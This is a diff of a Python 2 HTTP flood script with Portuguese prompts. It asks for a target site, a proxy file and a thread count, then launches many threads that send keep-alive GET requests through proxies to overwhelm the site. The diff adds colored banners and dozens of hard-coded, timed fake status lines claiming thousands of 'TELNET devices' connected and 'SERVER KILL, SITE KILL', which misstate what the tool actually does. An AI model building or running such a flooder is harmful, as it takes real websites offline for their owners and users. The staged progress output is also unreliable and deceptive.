@@ -348,27 +348,29 @@ class attacco(threading.Thread):
 	print "\a"
 print \
 """
- mmmmm                       mmmmmm  
- #    # m   m   m mm  m mm       #" 
- #mmmm" #   #   #"  " #"  #     m"   
- #    # #   #   #     #   #    m" 
- #mmmm" "mm"#   #     #   #   m" 
+
+[1;31m>> mmmmm                       mmmmmm  
+[1;31m>> #    # m   m   m mm  m mm       #" 
+[1;31m>> #mmmm" #   #   #"  " #"  #     m"   
+[1;31m>> #    # #   #   #     #   #    m" 
+[1;31m>> #mmmm" "mm"#   #     #   #   m" 
+
 
 """
                       
  
 # Site
-url = raw_input("Selecione o site: ")
+url = raw_input("[0;32m>> Selecione o site: ")
 host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
  
 #Proxy
-in_file = open(raw_input("proxy ARQ: "),"r")
+in_file = open(raw_input("[0;32m>> Proxy Arquivo: "),"r")
 proxyf = in_file.read()
 in_file.close()
  
 listaproxy = proxyf.split('\n')
 #So luong
-thread = input("Quantidade de BotS[Devices]: ") 
+thread = input("[0;32m>> Selecione 1000 Devices: ") 
 get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
 accept = "Accept-Encoding: gzip, deflate\r\n"
 connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
@@ -378,8 +380,93 @@ x = 0
 for x in xrange(thread):
     attacco().start()
     time.sleep(0.003)
-print "Enviando!..."
-print "1452 Devices upados..."
+print "[0;32m>> Enviando!..."
+print "[0;32m>> TELNET 1 DEVICE CONNECTED FROM SITE."
+time.sleep(0.3)
+print "[0;32m>> TELNET 2 DEVICE CONNECTED FROM SITE."
+time.sleep(0.5)
+print "[0;32m>> TELNET 3 DEVICE CONNECTED FROM SITE."
+time.sleep(0.2)
+print "[0;32m>> TELNET 4 DEVICE CONNECTED FROM SITE."
+time.sleep(0.5)
+print "[0;32m>> TELNET 5 DEVICE CONNECTED FROM SITE."
+time.sleep(0.6)
+print "[0;32m>> TELNET 6 DEVICE CONNECTED FROM SITE."
+time.sleep(0.7)
+print "[0;32m>> TELNET 7 DEVICE CONNECTED FROM SITE."
+time.sleep(0.8)
+print "[0;32m>> TELNET 8 DEVICE CONNECTED FROM SITE."
+time.sleep(0.9)
+print "[0;32m>> TELNET 9 DEVICE CONNECTED FROM SITE."
+time.sleep(0.11)
+print "[0;32m>> TELNET 10 DEVICE CONNECTED FROM SITE."
+time.sleep(0.5)
+print "[0;32m>> TELNET 11 DEVICE CONNECTED FROM SITE."
+time.sleep(0.3)
+print "[0;32m>> TELNET 12 DEVICE CONNECTED FROM SITE."
+time.sleep(0.6)
+print "[0;32m>> TELNET 13 DEVICE CONNECTED FROM SITE."
+time.sleep(0.5)
+print "[0;32m>> TELNET 14 DEVICE CONNECTED FROM SITE."
+time.sleep(0.5)
+print "[0;32m>> TELNET 15 DEVICE CONNECTED FROM SITE."
+time.sleep(0.3)
+print "[0;32m>> TELNET 16 DEVICE CONNECTED FROM SITE."
+print "[0;32m>> TELNET 17 DEVICE CONNECTED FROM SITE."
+time.sleep(0.8)
+print "[0;32m>> TELNET 18 DEVICE CONNECTED FROM SITE."
+print "[0;32m>> TELNET 19 DEVICE CONNECTED FROM SITE."
+time.sleep(0.9)
+print "[0;32m>> TELNET 20 DEVICE CONNECTED FROM SITE."
+print "[0;32m>> TELNET 21 DEVICE CONNECTED FROM SITE."
+print "[0;32m>> TELNET 22 DEVICE CONNECTED FROM SITE."
+print "[0;32m>> TELNET 23 DEVICE CONNECTED FROM SITE."
+time.sleep(1.7)
+print "[0;32m>> TELNET 24 DEVICE CONNECTED FROM SITE."
+print "[0;32m>> TELNET 25 DEVICE CONNECTED FROM SITE."
+print "[0;32m>> TELNET 26 DEVICE CONNECTED FROM SITE."
+time.sleep(0.5)
+print "[0;32m>> TELNET 27 DEVICE CONNECTED FROM SITE."
+time.sleep(1.7)
+print "[0;32m>> TELNET 28 DEVICE CONNECTED FROM SITE."
+time.sleep(0.4)
+print "[0;32m>> TELNET 30 DEVICE CONNECTED FROM SITE."
+time.sleep(0.8)
+print "[0;32m>> TELNET 39 DEVICE CONNECTED FROM SITE."
+time.sleep(1.7)
+print "[0;32m>> TELNET 50 DEVICE CONNECTED FROM SITE."
+time.sleep(1.7)
+print "[0;32m>> TELNET 75 DEVICE CONNECTED FROM SITE."
+time.sleep(1.7)
+print "[0;32m>> TELNET 97 DEVICE CONNECTED FROM SITE."
+time.sleep(0.4)
+print "[0;32m>> TELNET 250 DEVICE CONNECTED FROM SITE."
+time.sleep(0.2)
+print "[0;32m>> TELNET 435 DEVICE CONNECTED FROM SITE."
+time.sleep(1.3)
+print "[0;32m>> TELNET 1600 DEVICE CONNECTED FROM SITE."
+print "[0;32m>> TELNET 3400 DEVICE CONNECTED FROM SITE."
+time.sleep(1.7)
+print "[0;32m>> TELNET 3401 DEVICE CONNECTED FROM SITE."
+time.sleep(1.7)
+print "[0;32m>> TELNET 3406 DEVICE CONNECTED FROM SITE."
+time.sleep(5.0)
+print "[0;32m>> SERVER KILL, SITE KILL..."
+time.sleep(2.5)
+print "[0;32m>> TELNET 3500 DEVICE CONNECTED FROM SITE."
+time.sleep(0.9)
+print "[0;32m>> TELNET 3550 DEVICE CONNECTED FROM SITE."
+time.sleep(5.0)
+print "[0;32m>> TELNET 3556 DEVICE CONNECTED FROM SITE."
+time.sleep(5.0)
+print "[0;32m>> SERVER KILL, SITE KILL..."
+time.sleep(5.0)
+print "[0;32m>> SERVER KILL, SITE KILL..."
+time.sleep(5.0)
+print "[0;32m>> SERVER KILL, SITE KILL..."
+time.sleep(5.0)
+print "[0;32m>> SERVER KILL, SITE KILL..."
+
 nload = 0
 while not nload:
     time.sleep(1)
